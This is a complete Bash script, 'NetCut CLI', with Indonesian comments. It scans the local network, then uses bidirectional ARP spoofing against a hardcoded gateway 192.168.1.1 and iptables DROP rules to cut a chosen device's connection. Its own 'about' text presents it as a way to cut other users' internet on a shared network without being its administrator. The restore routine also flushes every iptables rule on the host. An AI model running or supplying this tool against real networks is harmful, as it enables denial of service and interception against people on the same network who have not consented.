#!/bin/bash
#------------------------------------------------------------------------
# NetCut CLI
#
# NetCut CLI adalah script Bash sederhana yang memungkinkan pengguna
# Linux memindai, memutus, dan memulihkan koneksi perangkat di jaringan
# lokal melalui teknik ARP spoofing.
#
# Versi   : 1.0
# Pembuat : Rofi [Fixploit03]
# GitHub  : https://github.com/fixploit03/NetCut-CLI
# Lisensi : MIT
#
# Script ini open-souce dan FREE! (alias bisa dimodifikasi dan GRATIS)
#------------------------------------------------------------------------

# Fungsi untuk mengecek apakah script dijalankan sebagai root atau tidak (DONE)
function cek_root(){
	if [[ "$EUID" -ne 0 ]]; then
		echo "[-] Script ini harus dijalankan sebagai root!"
		exit 1
	fi
}

# Fungsi untuk kembali ke menu utama dari script (DONE)
function ke_home(){
	echo ""
	read -p "Tekan [Enter] untuk kembali ke kemu utama..."
	main
}

# Fungsi untuk keluar dari script (DONE)
function keluar(){
	echo ""
	echo "Bye... ;)"
	exit 0
}

# Fungsi untuk seting interface yang ingin digunakan (DONE)
function seting_interface(){
	banner
	echo "Interface yang Tersedia:"
	echo ""

	list_interface=($(ifconfig | grep -oE '^[a-zA-Z0-9_]+' | sort -u))

	if [[ -z "${list_interface}" ]]; then
		echo "[-] Tidak ada interface yang ditemukan."
		exit 1
	fi

	for interface_yang_ditemukan in "${list_interface[@]}"; do
		echo "[+] ${interface_yang_ditemukan}"
	done

	echo ""
	while true; do
		read -p "[NetCut CLI] Masukkan nama interface: " interface
		ditemukan=0

		if [[ -z "${interface}" ]]; then
			echo "[-] Nama interface tidak boleh kosong."
			continue
		fi

		for iface in "${list_interface[@]}"; do
			if [[ "${interface}" == "${iface}" ]]; then
				ditemukan=1
				break
			fi
		done

		if [[ "${ditemukan}" -eq 1 ]]; then
			echo "[+] Interface '${interface}' ditemukan."
			echo "[+] Interface diseting ke -> ${interface}"
			break
		else
			echo "[-] Interface '${interface}' tidak ditemukan."
			continue
		fi
	done

	# Kembali ke menu utama script
	ke_home
}

# Fungsi untuk memindai target yang menjadi sasaran (DONE)
function scan_target(){
	banner
	echo "[*] Mencari target di jaringan lokal menggunakan interface '${interface_yang_digunakan}'..."
	echo ""
	arp-scan --interface="${interface_yang_digunakan}" --localnet
	echo ""
	while true; do
		read -p "[NetCut CLI] Masukkan IP Address target: " ip_address
		if [[ -z "${ip_address}" ]]; then
			echo "[-] IP Address target tidak boleh kosong."
			continue
		else
			echo "[+] Target sasaran disetin ke -> '${ip_address}'"
			break
		fi
	done

	# Kembali ke menu utama script
	ke_home
}

# Fungsi untuk memutuskan koneksi target (DONE)
function putuskan_koneksi(){
	# Manggil fungsi banner
	banner

	# Mengaktifkan IP Forwading (OK)
	echo "[*] Mengaktifkan IP Forwarding..."
	if echo 1 | tee /proc/sys/net/ipv4/ip_forward; then
		echo "[+] IP Forwarding berhasil diaktifkan."
	else
		echo "[-] Gagal mengaktifkan IP Forwarding."
	fi

	# Menjalankan ARP Spoofing dari gateway '192.168.1.1' ke target (OK)
	echo "[*] Menjalankan ARP Spoofing dari gateway '192.168.1.1' ke target '${target_sasaran}'..."
	arpspoof -i "${interface_yang_digunakan}" -t "${target_sasaran}" "192.168.1.1" &>/dev/null &
	if [[ $? -eq 0 ]]; then
		echo "[+] ARP Spoofing dari gateway '192.168.1.1' ke target '${target_sasaran}' berhasil dijalankan."
	else
		echo "[-] Gagal menjalankan ARP Spoofing dari gateway '192.168.1.1' ke target '${target_sasaran}'."
	fi

	# Menjalankan ARP Spoofing dari target ke gateway '192.168.1.1' (OK)
	echo "[*] Menjalankan ARP Spoofing dari target '${target_sasaran}' ke gateway '192.168.1.1'..."
	arpspoof -i "${interface_yang_digunakan}" -t "192.168.1.1" "${target_sasaran}" &>/dev/null &
	if [[ $? -eq 0 ]]; then
		echo "[+] ARP Spoofing dari target '${target_sasaran}' ke gateway '192.168.1.1' berhasil dijalankan."
	else
		echo "[-] Gagal menjalankan ARP Spoofing dari target '${target_sasaran}' ke gateway '192.168.1.1'."
	fi

	# Memutuskan koneksi target menggunakan 'iptables' (OK)
	echo "[*] Memutuskan koneksi target '${target_sasaran}' menggunakan 'iptables'..."
	if iptables -A FORWARD -s "${target_sasaran}" -j DROP && iptables -A FORWARD -d "${target_sasaran}" -j DROP; then
		echo "[+] Koneksi target '${target_sasaran}' berhasil diputuskan menggunakan 'iptabels'."
	else
		echo "[-] Gagal memutuskan koneksi target '${target_sasaran}' menggunakan 'iptables'."
	fi

	# Kembali ke menu utama script
	ke_home
}

# Fungsi untuk mengembalikan koneksi target (DONE)
function kembalikan_koneksi(){
	# Manggil fungsi banner (OK)
	banner

	# Membunuh proses 'arpspoof' menggunakan 'pkill' dengan sinyal SIGKILL (-9) (OK)
	echo "[*] Membunuh proses 'arpspoof' menggunakan 'pkill' dengan sinyal SIGKILL (-9)..."
	if pkill -9 arpspoof; then
		echo "[+] Proses 'arpspoof' berhasil dibunuh menggunakan 'pkill' dengan sinyal SIGKILL (-9)."
	else
		echo "[-] Gagal membunuh proses 'arpspoof' menggunakan 'pkill' dengan sinyal SIGKILL (-9)."
	fi

	# Mengirim paket ARP reply dari gateway '192.168.1.1' ke target selama 5 detik (OK)
	echo "[*] Mengirim paket ARP reply dari gateway '192.168.1.1' ke target '${target_sasaran}' selama 5 detik..."
	timeout 5 arpspoof -i "${interface_yang_digunakan}" -t "${target_sasaran}" "192.168.1.1"
	code=$?

	if [[ "${code}" -eq 0 || "${code}" -eq 124 ]]; then
		echo "[+] Paket ARP reply berhasil dikirim dari gateway '192.168.1.1' ke target '${target_sasaran}'."
	else
		echo "[-] Gagal mengirim paket ARP reply dari gateway '192.168.1.1' ke target '${target_sasaran}'."
	fi

	# Mengirim paket ARP reply dari target ke gateway (192.168.1.1) selama 5 detik
	# echo "[*] Mengirim paket ARP reply dari target (${ip_address}) ke gateway (192.168.1.1) selama 5 detik..."
	# timeout 5 arpspoof -i "${interface}" -t "192.168.1.1" "${ip_address}"
	# code=$?
	#
	# if [[ "${code}" -eq 0 || "${code}" -eq 124 ]]; then
	#	echo "[+] Paket ARP reply berhasil dikirim dari target (${ip_address}) ke gateway (192.168.1.1)."
	# else
	#	echo "[-] Gagal mengirim paket ARP reply dari target (${ip_address}) ke gateway (192.168.1.1)."
	# fi
	#
	# Menunggu selama 10 detik sampai koneksi target pulih
	# echo "[*] Menunggu selama 10 detik sampai koneksi target pulih..."
	# sleep 10

	# Menonaktifkan IP Forwarding (OK)
	echo "[*] Menonaktifkan IP Forwarding..."
	if echo 0 | tee /proc/sys/net/ipv4/ip_forward; then
		echo "[+] IP Forwarding berhasil dinonaktifkan."
	else
		echo "[-] Gagal menonaktifkan IP Forwarding."
	fi

	# Memulihkan koneksi target menggunakan 'iptables' (OK)
	echo "[*] Memulihkan koneksi target '${target_sasaran}' menggunakan 'iptables'..."
	if iptables -D FORWARD -s "${target_sasaran}" -j DROP && iptables -D FORWARD -d "${target_sasaran}" -j DROP && iptables -F; then
		echo "[+] Koneksi target '${target_sasaran}' berhasil dipulihkan."
	else
		echo "[-] Gagal memulihkan koneksi target '${target_sasaran}'."
	fi

	# Kembali ke menu utama script
	ke_home
}

# Fungsi untuk menampilkan tentang script NetCut CLI (DONE)
function tentang(){

	# Manggil fungsi banner
	banner

	echo "Tentang NetCut CLI"
	echo ""
	echo "NetCut CLI"
	echo "----------"
	echo ""
	echo "NetCut CLI adalah script Bash sederhana yang memungkinkan pengguna"
	echo "Linux memindai, memutus, dan memulihkan koneksi perangkat di jaringan"
	echo "lokal melalui teknik ARP spoofing."
	echo ""
	echo "Latar Belakang"
	echo "--------------"
	echo ""
	echo "Terciptanya NetCut CLI karena saya terinspirasi dari salah satu"
	echo "aplikasi populer dijaman kejayaan warnet yaitu nama aplikasinya"
	echo "NetCut, dimana NetCut ini bisa memutuskan koneksi internet siapa"
	echo "saja yang ada di satu jaringan yang sama, walaupun dia bukan"
	echo "sebagai seorang Administrator jaringan NetCut bisa melakukannya."
	echo "Nah, NetCut kan hanya ada di Sistem operasi Windows, saya"
	echo "membuat NetCut CLI ini agar user Linux seperti saya ini bisa"
	echo "merasakan yang namanya aplikasi NetCut di Linux, meski hanya"
	echo "memiliki interface CLI, tapi fungsinya sama seperti yang ada"
	echo "di aplikasi NetCut yang ada di Windows."

	# Kembali ke menu utama script
	ke_home
}

# Fungsi untuk menampilkan banner script (DONE)
function banner(){
	clear
	echo " _   _      _    ____      _      ____ _     ___ "
	echo "| \ | | ___| |_ / ___|   _| |_   / ___| |   |_ _|"
	echo "|  \| |/ _ \ __| |  | | | | __| | |   | |    | | "
	echo "| |\  |  __/ |_| |__| |_| | |_  | |___| |___ | | "
	echo "|_| \_|\___|\__|\____\__,_|\__|  \____|_____|___| v1.0"
	echo ""
	echo "+--------------------------------------------------+"
	echo "| Dibuat oleh: Rofi [Fixploit03]                   |"
	echo "| GitHub: https://github.com/fixploit03/netcut-cli |"
	echo "+--------------------------------------------------+"
	echo ""
}

# Fungsi utama script
function main(){

	# Manggil fungsi banner
	banner

	# Inisialiasi variaberl interface dan target
	interface_yang_digunakan="${interface}"
	target_sasaran="${ip_address}"

	# Jika variabel 'interface_yang_digunakan' kosong
	if [[ -z "${interface_yang_digunakan}" ]]; then
		si="[-]"
		interface_yang_digunakan="Belum diatur"
		interface_diseting=0
	else
		si="[+]"
		interface_diseting=1
	fi

	# Jika variabel 'target_sasaran' kosong
	if [[ -z "${target_sasaran}" ]]; then
		st="[-]"
		target_sasaran="Belum diatur"
		target_diseting=0
	else
		st="[+]"
		target_diseting=1
	fi

	# Menu yang tersedia di script NetCut CLI
	echo "${si} Interface: ${interface_yang_digunakan}"
	echo "${st} Target: ${target_sasaran}"
	echo ""
	echo "Daftar Menu NetCut CLI:"
	echo "----------------------------------------------------"
	echo "[0] Keluar"
	echo "[1] Seting Interface"
	echo "[2] Scan Target"
	echo "[3] Putuskan Koneksi Target"
	echo "[4] Pulihkan Koneksi Target"
	echo "[5] Tentang NetCut CLI"
	echo ""

	# Pilih menu
	while true; do
		read -p "[NetCut CLI] Pili menu (0-7): " pilih_menu
		# OK
		if [[ "${pilih_menu}" == "0" ]]; then
			keluar
			break
		# OK
		elif [[ "${pilih_menu}" == "1" ]]; then
			seting_interface
			break
		# OK
		elif [[ "${pilih_menu}" == "2" ]]; then
			if [[ "${interface_diseting}" -eq 0 ]]; then
				echo ""
				echo "[-] Interface belum diseting."
				echo "[-] Silahkan pilih menu nomor 1 terlebih dahulu untuk mengaturnya."
				ke_home
				break
			fi
			scan_target
			break
		# OK
		elif [[ "${pilih_menu}" == "3" ]]; then
			putuskan_koneksi
			break
		# OK
		elif [[ "${pilih_menu}" == "4" ]]; then
			kembalikan_koneksi
			break
		# OK
		elif [[ "${pilih_menu}" == "5" ]]; then
			tentang
			break
		fi
	done
}

# Jalanin script (DONE)
cek_root
main
